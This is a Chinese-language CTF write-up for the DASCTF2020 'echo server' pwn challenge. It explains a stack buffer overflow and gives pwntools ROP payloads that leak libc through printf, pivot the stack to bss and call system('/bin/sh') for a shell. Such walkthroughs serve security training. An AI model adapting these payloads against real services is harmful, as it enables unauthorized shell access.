
## echo server (100pt)
- 题目描述：
  
    > echo server
- 题目附件：[test](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/DASCTF2020/pwn/test/test)
- 考察点：rop
- 难度：简单

### 程序分析

获取名字的函数存在缓冲区溢出

```c
int sub_4006D2(){
  unsigned int len; // [rsp+Ch] [rbp-84h]
  char s; // [rsp+10h] [rbp-80h]

  len = 0;
  printf("how long is your name: ");
  __isoc99_scanf("%d", &len);
  printf("and what's you name? ", &len);
  memset(&s, 0, 0x80uLL);
  get_name(&s, len);
  return printf("hello %s", &s);
}
```

### 解题思路
#### ret2text

直接用函数中的`printf`泄漏libc：

```nasm
.text:00000000004006E7      lea     rdi, format     ; "how long is your name: "
.text:00000000004006EE      mov     eax, 0
.text:00000000004006F3      call    _printf
.text:00000000004006F8      lea     rax, [rbp+len]
.text:00000000004006FF      mov     rsi, rax
.text:0000000000400702      lea     rdi, aD         ; "%d"
.text:0000000000400709      mov     eax, 0
.text:000000000040070E      call    ___isoc99_scanf
.text:0000000000400713      lea     rdi, aAndWhatSYouNam ; "and what's you name? "
```

用`pop rdi;ret`的gadget把`rdi`设置成`got['printf']`，然后ret到`0x4006EE`这里调用`printf`去泄漏libc

> 调用`printf`的时候`eax`要清零，所以没直接用plt表

```python
# rop1
offset = 136-8
payload = '\0'*offset
payload += p64(elf.bss()+0x800)  # stack-pivot
payload += p64(prdi)+p64(elf.got['printf'])+p64(0x4006EE)+p64(0xdeadbeef)

sla('how long is your name: ','1000')
sla('and what\'s you name? ',payload)
ru('hello ')

printf = uu64(rc(14))
info_addr('printf',printf)
libcbase = printf - libc.sym['printf']
system = libcbase + libc.sym['system']
binsh = libcbase  + libc.search("/bin/sh").next()
```

> 这里要覆盖一下rbp，把栈迁移到bss段（因为函数结尾有leave-ret）

随后还会继续读数据到缓冲区，也就是说仍然存在缓冲区溢出，只不过这次的溢出在bss段

```python
# rop2
offset = 136-8
pl2 = '\0'*offset
pl2 += p64(elf.bss()+0x800)
pl2 += p64(ret)+p64(prdi)+p64(binsh)+p64(system)+p64(0xdeadbeef)

sl('1000')
sla('and what\'s you name? ',pl2)
```

> 用的是`bss+0x800`，因为`system`需要的栈空间比较大，设置小了的话会报错(会跑到只读的data段)

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/DASCTF2020/pwn/test) 

